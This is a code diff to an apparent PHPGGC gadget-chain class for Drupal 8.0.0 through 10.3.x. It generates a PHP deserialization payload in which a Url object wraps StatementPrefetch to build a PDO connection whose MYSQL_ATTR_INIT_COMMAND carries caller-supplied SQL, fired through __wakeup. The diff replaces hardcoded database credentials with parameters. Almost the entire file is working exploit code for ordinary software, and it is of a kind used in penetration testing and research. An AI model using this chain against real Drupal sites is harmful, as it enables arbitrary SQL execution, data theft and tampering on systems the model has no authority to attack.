@@ -2,7 +2,7 @@
 
 namespace GadgetChain\Drupal;
 
-class SQLI1 extends \PHPGGC\GadgetChain\SqlInjection
+class SQLI1 extends \PHPGGC\GadgetChain\SQLI\MySQLAuthenticatedSQLI
 {
     public static $version = '>= 8.0.0 < 10.2.11 || >= 10.3.0 < 10.3.9';
     public static $vector = '__wakeup';
@@ -13,14 +13,16 @@ class SQLI1 extends \PHPGGC\GadgetChain\SqlInjection
 
     public function generate(array $parameters)
     {
+        $dsn = 'mysql:dbname=' . $parameters['dbname'] . ';host=' . $parameters['host'];
+        
         return new \Drupal\Core\Url(
             new \Drupal\Core\Database\StatementPrefetch(
-                'PDO',                                // class
+                'PDO',                        // class
                 [
-                    'mysql:dbname=db;host=db',        // DSN
-                    'db',                             // username
-                    'db',                             // password
-                    [1002 => $parameters['sql']]      // PDO::MYSQL_ATTR_INIT_COMMAND
+                    $dsn,                    // DSN
+                    $parameters['username'],  // username
+                    $parameters['password'],  // password
+                    [1002 => $parameters['sql']]  // PDO::MYSQL_ATTR_INIT_COMMAND
                 ]
             )
         );
